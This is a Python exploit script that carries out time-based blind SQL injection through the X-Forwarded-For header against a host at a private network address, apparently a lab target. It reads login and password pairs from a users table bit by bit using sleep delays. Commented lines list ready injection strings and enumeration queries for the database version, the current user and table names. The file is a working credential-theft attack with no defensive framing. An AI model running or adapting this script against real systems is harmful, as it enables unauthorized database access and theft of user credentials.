import requests
from time import time

VULNERABLE_HOST = "http://192.168.77.128"
PORT = 80

# "SELECT column_name FROM information_schema.columns"

def make_request(sql: str):
  
    injection = f"hacker' or if(({sql}),sleep({sleep_setting}),0) and '1'='1"
    #print("injection: "+ injection)
    headers = {"X-Forwarded-For": f"{injection}"}
    tic = time()
    try:
        requests.get(
            VULNERABLE_HOST, proxies=None, verify=False, headers=headers
        )
    except:
        print("encountered error connecting")
        exit()
    toc = time()
    run_time = toc - tic

    if run_time > sleep_setting:
        return True
    else:
        return False


i = 0
value = 1
result = ""
index = 0
sleep_setting = 2

query = "SELECT concat(login,':',password) from users"

while index < 10:

    new_injection = query + f" limit {index},1"
    #print("\nNew injection: " + new_injection + "\n")
    while value != 0:
        i += 1
        value = 0
        for bit in range(0, 7):
            #sql = f"select ascii(substring(({new_injection}),{i},1))"
            print(f"Bit: {+2**bit}")
            sql = f"select ascii(substring(({new_injection}),{i},1))&{2**bit}" #Two is the base of the binary numeral system
            # print("sql: "+sql)
            if make_request(sql) == True:

                value += 2 ** bit
                print(f"Value: {value}")
                # print("\n"+chr(value)+"\n")


        result += chr(value)
        print(f"Testing... Found: {result}")

    print(f"Result: {result}")


    value = 1
    result = ""
    i = 0
    index += 1

# "SELECT version()"
# "SELECT user()"
# "SELECT table_name FROM information_schema.tables"
# "SELECT concat(login,':',password) from users"

# select ascii(substring((select concat(login,':',password) from users limit 0,1),1,1))&64


# injection: hacker' or if((select ascii(substring((select concat(login,':',password) from users limit 0,1),1,1))&1),sleep(2),0) and '1'='1
# injection: hacker' or if((select ascii(substring((select concat(login,':',password) from users limit 0,1),1,1))&2),sleep(2),0) and '1'='1
# injection: hacker' or if((select ascii(substring((select concat(login,':',password) from users limit 0,1),1,1))&4),sleep(2),0) and '1'='1
# injection: hacker' or if((select ascii(substring((select concat(login,':',password) from users limit 0,1),1,1))&8),sleep(2),0) and '1'='1
# injection: hacker' or if((select ascii(substring((select concat(login,':',password) from users limit 0,1),1,1))&16),sleep(2),0) and '1'='1
# injection: hacker' or if((select ascii(substring((select concat(login,':',password) from users limit 0,1),1,1))&32),sleep(2),0) and '1'='1
